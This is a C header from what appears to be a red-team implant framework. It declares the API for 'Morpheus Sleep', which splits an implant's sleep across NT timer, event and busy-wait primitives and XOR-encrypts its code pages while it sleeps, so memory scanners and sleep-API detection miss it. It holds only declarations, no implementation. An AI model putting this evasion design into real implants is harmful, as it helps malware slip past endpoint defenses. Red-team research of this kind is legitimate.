/*
 * Vendored for Tempest (imps/win-stargate). Do not #include from ../../techniques/ — builds
 * must not depend on the techniques/ tree. Upstream reference: techniques/BM-T6001.
 *
 * BM-T6001: Morpheus Sleep — Mixed-Technique Sleep Obfuscation
 *
 * Avoid Sleep() API detection by splitting sleep time into random chunks,
 * each using a different NT-native sleep primitive. During sleep, code
 * sections are RX→RW→XOR-encrypted→sleep→decrypted→RX to defeat
 * memory scanners.
 *
 * Techniques (NtDelayExecution deliberately excluded — too easily profiled):
 *   1. NtCreateTimer+NtSetTimer+NtWaitForSingleObject — Timer-based sleep
 *   2. NtCreateEvent+NtWaitForSingleObject (timeout)  — Event-based sleep
 *   3. Encrypted busy-wait     — XOR encrypt/decrypt loop (no sleep API)
 *
 * Platform: Windows x64
 * Requires: ntdll.dll (always loaded)
 *
 * Based on sleep obfuscation patterns from gc2 (Teach2Breach).
 *
 * WARNING: Educational code for authorized security research only.
 */

#ifndef MORPHEUS_H
#define MORPHEUS_H

#include <windows.h>

/* ── Return codes ─────────────────────────────────────────────────── */

#define MORPHEUS_OK              0
#define MORPHEUS_ERR_RESOLVE     1   /* Failed to resolve NT functions   */
#define MORPHEUS_ERR_TIMER       2   /* NtCreateTimer failed             */
#define MORPHEUS_ERR_SLEEP       3   /* Sleep primitive failed           */
#define MORPHEUS_ERR_PROTECT     4   /* NtProtectVirtualMemory failed    */

/* ── Sleep technique IDs ──────────────────────────────────────────── */

typedef enum {
    MORPHEUS_TECHNIQUE_TIMER = 0,   /* NtCreateTimer + NtSetTimer + Wait*/
    MORPHEUS_TECHNIQUE_EVENT,       /* NtCreateEvent + NtWaitForSingle  */
    MORPHEUS_TECHNIQUE_BUSYWAIT,    /* Encrypted busy-wait (no API)     */
    MORPHEUS_TECHNIQUE_COUNT        /* Sentinel — number of techniques  */
} morpheus_technique_t;

/* ── Configuration ────────────────────────────────────────────────── */

/* ── Technique selection mode ─────────────────────────────────────── */

#define MORPHEUS_SELECT_RANDOM      0   /* Uniform random per chunk      */
#define MORPHEUS_SELECT_ROUND_ROBIN 1   /* Cycle through in order        */
#define MORPHEUS_SELECT_WEIGHTED    2   /* Weighted random (gc2 style)   */

/*
 * Optional per-chunk callback for diagnostics/logging.
 * Called before each sleep chunk with: technique index, chunk duration (ms).
 * Set to NULL to disable (default). Only use in demos — not for production.
 */
typedef void (*morpheus_chunk_cb_t)(DWORD technique, DWORD chunk_ms);

typedef struct {
    DWORD  jitter_percent;       /* 0-50: random +/- applied to sleep  */
    BYTE   xor_key;              /* XOR key for page encryption        */
    BOOL   enable_page_guard;    /* Encrypt code section during sleep  */
    DWORD  technique_selection;  /* RANDOM, ROUND_ROBIN, or WEIGHTED   */
    void  *guard_base;           /* Base address to protect (NULL=auto)*/
    SIZE_T guard_size;           /* Size to protect (0=auto-discover)  */
    morpheus_chunk_cb_t chunk_cb; /* Optional chunk callback (NULL=off) */
} morpheus_config_t;

/* Default config: 15% jitter, 0xAA XOR key, page guard enabled, weighted random, no callback */
#define MORPHEUS_CONFIG_DEFAULT { 15, 0xAA, TRUE, MORPHEUS_SELECT_WEIGHTED, NULL, 0, NULL }

/*
 * Technique name lookup (for diagnostics only — NOT for production binaries).
 * Returns a static string like "timer", "event", "busywait".
 */
const char *morpheus_technique_name(DWORD technique);

/* ── Opaque context (initialized by morpheus_init) ────────────────── */

typedef struct morpheus_ctx morpheus_ctx_t;

/*
 * Initialize the Morpheus sleep engine.
 * Resolves NT functions, discovers code section if page guard is enabled.
 * Caller must call morpheus_cleanup() when done.
 *
 * Returns: MORPHEUS_OK on success, error code on failure.
 *          *out_ctx is set to the allocated context.
 */
int morpheus_init(const morpheus_config_t *config, morpheus_ctx_t **out_ctx);

/*
 * Sleep for approximately `ms` milliseconds using mixed techniques.
 *
 * The total sleep is split into random chunks (2–5 seconds each).
 * Each chunk uses a randomly selected sleep primitive.
 * If page guard is enabled, code is encrypted during each chunk.
 *
 * Returns: MORPHEUS_OK on success.
 */
int morpheus_sleep(morpheus_ctx_t *ctx, DWORD ms);

/*
 * Free resources and restore any modified memory protections.
 */
void morpheus_cleanup(morpheus_ctx_t *ctx);

#endif /* MORPHEUS_H */
